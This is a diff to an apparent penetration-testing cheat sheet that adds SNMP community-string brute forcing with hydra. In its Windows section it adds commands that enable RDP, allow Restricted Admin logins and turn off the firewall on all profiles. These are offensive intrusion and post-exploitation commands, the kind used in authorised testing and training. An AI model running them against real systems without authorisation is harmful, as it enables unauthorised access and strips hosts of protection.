@@ -2573,7 +2573,7 @@ snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.3.1.1
 snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.27
 snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.6.13.1.3
 snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.6.3.1.2
-snmpwalk -v 2c -c security <RHOST> NET-SNMP-EXTEND-MIB::nsExtendOutputFull NET-SNMP-EXTEND-MIB::nsExtendedOutputFull."password" = STRING: USER:PASS
+snmpwalk -v 2c -c security <RHOST> NET-SNMP-EXTEND-MIB::nsExtendOutputFull 
 snmpwalk -v 2c -c public <RHOST> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
 snmpwalk -v 1 -c public  <RHOST> NET-SNMP-EXTEND-MIB::nsExtendObjects
 ```
@@ -2585,6 +2585,9 @@ https://www.poplabsec.com/snmp-pentesting/
 python3 snmpbrute.py -t IP
 ```
 
+```c
+hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target-ip> snmp
+```
 
 
 ### Web Application Analysis
@@ -9166,6 +9169,17 @@ winrm quickconfig
 ```c
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 netsh advfirewall firewall set rule group="remote desktop" new enable=yes
+```
+
+or
+
+```c
+Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
+Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 1
+reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD
+$rdpEnabled = 0 -eq (Get-ItemPropertyValue 'HKLM:\System\CurrentControlSet\Control\Terminal Server' fDenyTSConnections)
+$rdpEnabled
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 ```
 
 or
